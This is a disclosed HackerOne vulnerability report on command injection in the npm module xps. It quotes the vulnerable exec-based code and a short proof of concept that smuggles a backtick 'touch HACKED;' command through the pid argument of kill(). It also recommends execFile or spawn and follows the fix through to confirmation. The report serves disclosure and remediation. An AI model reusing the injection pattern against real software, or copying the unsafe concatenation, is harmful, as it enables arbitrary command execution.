---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/node
  - vuln/command-injection
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2020-07-23
submitted: 2020-05-03T10:10:58.198Z
bounty_usd: null
votes: 0
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "d3lla"
source: "https://hackerone.com/reports/865168"
title: "[xps] Command Injection via insecure command concatenation"
---
# [xps] Command Injection via insecure command concatenation

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 0 | **Program:** Node.js third-party modules | **Disclosed:** 2020-07-23

- Report: [https://hackerone.com/reports/865168](https://hackerone.com/reports/865168)
- CWE: Command Injection - Generic
- Submitted: 2020-05-03T10:10:58.198Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a `Command Injection` issue in the `xps` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `xps`
**version:** `1.0.2`
**npm page:** `https://www.npmjs.com/package/xps`

## Module Description

xps is a cross-platform library for listing and killing processes.

## Module Stats

[10] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

Here's the code which causes the issue:

```javascript
// https://github.com/robotlolita/xps/blob/master/lib/linux.js#L48
...
var shell = require('./utils').shell;
... 
exports.kill = kill;
function kill(pid) {
  return shell('kill', ['-9', pid]).map(K(undefined));  // <-- user's input
}

// --------------------------------------------------
// https://github.com/robotlolita/xps/blob/master/lib/utils.js#L26
...
var exec    = require('child_process').exec;
...
var escapeArg = JSON.stringify;
...
exports.shell = shell;
function shell(cmd, args) {
  var command = cmd + ' ' + args.map(unary(compose(escapeArg)(String))).join(' '); // <-- injection
  return new Task(function(reject, resolve) {
    exec(command, function(error, stdout, stderr) {
      if (error)  reject(error);
      else        resolve({ output: stdout, error: stderr });
    });
  });
}
```
The argument `pid` is used to build the command that is passed to the `child_process.exec` function without any sanitization.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `xps` module:
    -  `npm i xps`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const ps = require('xps');
ps.kill('`touch HACKED;`').fork();
```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F813050}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.
In this case it could be helpful to parse the pid as integer (`var pid = parseInt(pid)`).

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on a `xps` module via insecure command concatenation.

## Timeline

- **Report Filed**
- **2020-05-03** @nochnoidozor: Hi @d3lla,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Triaged**
- **External User Joined**
- **2020-07-23** @bbe8482aecd24374d13c5de15a0a6: Hi @d3lla,

there is a new version released with a patch which should prevent and fix this by checking the type of the supplied input.

Can you confirm that this fixes the reported vulnerability?

https://github.com/sorellabs/xps/commit/768481146b8ead3811310eecc0f56e2d107cb740
- **2020-07-23** @d3lla: Hi everybody,
@danielruf Thanks for bringing this to my attention.

@robotlolita Thank you for the fix. 
Your changes seems to fix the problem. 
I run the previous poc:
```javascript
const ps = require('xps');
ps.kill('`touch HACKED;`').fork();
```

and I was not able to reproduce the previous reported result.

Thank you for your time and have a nice day, 
d3lla

I tested using the following configurations:
* OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
* NODEJS VERSION: v14.2.0
* NPM VERSION: 6.14.4
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
